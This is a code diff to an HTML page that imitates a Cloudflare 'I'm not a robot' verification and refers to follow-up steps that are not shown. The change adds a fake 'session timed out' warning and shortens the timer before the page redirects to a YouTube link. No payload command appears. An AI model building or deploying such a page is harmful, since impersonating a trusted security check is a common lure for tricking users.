@@ -109,6 +109,14 @@
 <img src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare" width="20px" height="20px">
       <span>I’m not a robot</span>
     </div>
+    <div class="warning" id="timeoutWarning" style="display: flex;">
+      <div class="warning-icon">⚠️</div>
+      <div>
+Session timed out for security reasons.
+Redirecting in 5 seconds...
+      </div>
+    </div>
+  </div>
 
     <div class="instruction" id="instruction" style="display: block;">
       <p>If verification does not complete, please follow the steps below:</p>
@@ -143,15 +151,18 @@
   document.getElementById('instruction').style.display = 'none';
   document.getElementById('checkbox').style.backgroundColor = '';
   document.getElementById('warning').style.display = 'none';
+  document.getElementById('timeoutWarning').style.display = 'none';
 };
-    setTimeout(function () {
-  document.getElementById('warning').style.display = 'flex';
-  document.getElementById('warning').querySelector("div").innerHTML += "<br><em>Session expired. Redirecting...</em>";
-}, 85000); // show warning at 85 sec
+    // After 5 seconds, show timeout warning
+    setTimeout(() => {
+      document.getElementById('timeoutWarning').style.display = 'flex';
 
-setTimeout(function () {
-  window.location.href = "https://youtu.be/dPmZqsQNzGA";
-}, 90000); // redirect at 90 sec
+      // Redirect 5 seconds after timeout warning
+      setTimeout(() => {
+        window.location.href = "https://youtu.be/dPmZqsQNzGA";
+      }, 5000);
+
+    }, 5000)
 
   </script>
 
